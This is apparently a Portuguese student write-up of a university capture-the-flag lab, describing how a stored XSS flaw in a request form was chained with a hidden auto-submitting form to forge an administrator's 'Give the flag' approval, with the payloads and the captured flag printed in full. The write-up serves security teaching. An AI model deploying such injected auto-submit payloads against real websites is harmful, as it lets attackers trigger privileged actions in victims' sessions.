# CTF 6

* Ao abrirmos a página web do CTF6 (http://ctf-fsi.fe.up.pt:5004/request), deparamo-nos com o *id do request* e com um *form* que podíamos submeter

* Reparamos que, ao submeter o *form*, o conteúdo introduzido como input era apresentado numa dada página web para a qual éramos redirecionados e que o endereço dessa página era http://ctf-fsi.fe.up.pt:5004/request/id

* Experimentamos, então, submeter um *script* (`<script>alert('Hello')</script>`) para averiguar se a página estava protegida contra XSS e verificamos que o *script* era executado 

* Ao clicarmos no botão *page* da página do pedido, fomos encaminhados para a página (http://ctf-fsi.fe.up.pt:5005/request/id) que contém dois botões bloqueados para nós, mas disponíveis para o administrador: *Give the Flag* e *Mark request as read* 

* Ao analisarmos o código HTML da página, verificamos que o botão *Give the Flag* tinha o id `giveflag`

* Observados os últimos três pontos, a nossa primeira tentativa foi criar o seguinte *script* com código JavaScript para clicar no botão *Give the Flag* e, assim, obter a *flag*

```html
<script>
    document.getElementById('giveflag').click();
</script>
```

* No entanto, ao submetermos o *script* no *form*, não nos foi dada a *flag*, pois esta abordagem não explorava nenhuma vulnerabilidade CSRF

* Assim, vimos que o *form* que era utilizado no botão bloqueado *Give the Flag* era o seguinte

```html
<form method="POST" action="/request/id/approve" role="form">
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag" disabled="">
    </div>
</form>
``` 

* Então, recriamos este código acrescentando o *script* em cima mencionado e submetê-mo-lo

```html	
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/id/approve" role="form" hidden>
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag">
    </div>
    <script>
        document.getElementById('giveflag').click();
    </script>
</form>
```
* Ao submetê-lo, fomos supreendidos com um aviso de que não tínhamos permissões para aceder ao recurso pretendido 

![Forbidden](/images/logbook6-forbidden.png)

* Averiguamos que esse aviso aparecia porque o site tinha autorização para usar JavaScript, então tiramos essa autorização de forma a que não fôssemos nós a clicar no botão e, assim, não criar o aviso

* Desta forma, voltamos a submeter o código que criamos com o *form* e o *script*, submetê-mo-lo, atualizamos a página e obtivemos a *flag* ```flag{aad6d1bf4d22b50c3070ee1280ccfd49}```	

![Flag](/images/logbook6-flag.png)